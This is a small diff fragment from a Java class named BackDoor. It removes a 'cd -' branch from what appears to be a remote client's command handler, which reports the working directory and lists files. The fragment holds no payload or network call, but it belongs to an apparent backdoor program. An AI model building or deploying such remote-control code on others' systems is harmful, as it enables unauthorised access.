@@ -42,10 +42,6 @@ public class BackDoor {
 					writer.write("\nWorking directory is: "+workingDir+"\n\n");
 				}
 				
-				else if(clientCommand.equalsIgnoreCase("cd -")) {
-					writer.write("\nBack to the first directory is: ");
-				}
-				
 				else if(clientCommand.equalsIgnoreCase("dir")){
 					writer.write("\nShould list files in the current directory \n\n");
 					File currentDirectory=new File(workingDir);
